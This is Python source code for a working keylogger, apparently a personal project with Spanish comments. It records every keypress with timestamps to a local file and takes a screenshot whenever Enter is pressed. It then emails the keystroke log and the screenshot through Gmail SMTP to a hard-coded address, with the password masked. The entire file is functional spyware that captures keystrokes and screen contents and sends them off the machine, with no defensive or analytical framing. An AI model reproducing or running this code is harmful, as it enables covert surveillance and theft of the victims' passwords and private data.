import pyautogui
from pynput import keyboard
import sys,time
from tim import TIME
import random,string
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.base import MIMEBase
from datetime import datetime


texto=""
condition = False
image = ""


def on_press(key):
    global texto
    global condition
    global image
    if str(key) == 'Key.esc':
        sys.exit()
    elif str(key) == 'Key.enter':
        texto = texto + TIME().Years() + '|' + TIME().Hours() + f':{key} Pressed...' + '\n'
        f = open('archivo.txt', 'w')
        f.writelines(texto)
        f.close()
        pyautogui.sleep(3)
        img=randomfunc(5)
        pyautogui.screenshot('image_' + img + '.png')
        image = "image_" + img + ".png"
        SendEmail()
    else:
        texto = texto + TIME().Years() + '|' + TIME().Hours() + f':{key} Pressed...' + '\n'
        f = open('archivo.txt', 'w')
        f.writelines(texto)
        f.close()


#Funcion para que el nombre de las imagenes sean aleatorios

def randomfunc(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


def FormatEmail():

    actualdate = datetime.now().strftime("%Y/%m/%d %H:%M:%S")
    message = MIMEMultipart("plain")
    message["From"]= "aalcobendas99@gmail.com"
    message["To"] = "aalcobendas99@gmail.com"
    message["Subject"] = "Keylogger_ " + actualdate
    adj = MIMEBase("application", "octect-stream")
    adj.set_payload(open("archivo.txt", "rb").read())
    adj.add_header("content-Disposition", 'attachment; filename = "keylogger.txt"')
    message.attach(adj)

    file = open ("%s" % image, "rb")
    attach_image = MIMEImage(file.read())
    attach_image.add_header('Content-Disposition', 'attachment; filename = "Captura"')
    message.attach(attach_image)

    return message

def SendEmail():

    message = FormatEmail()
    smtp = SMTP ("smtp.gmail.com")
    smtp.starttls()
    smtp.login("aalcobendas99@gmail.com", "******")
    smtp.sendmail("aalcobendas99@gmail.com", "aalcobendas99@gmail.com",message.as_string())
    smtp.quit()



with keyboard.Listener(
    on_press = on_press) as listener:
    listener.join()
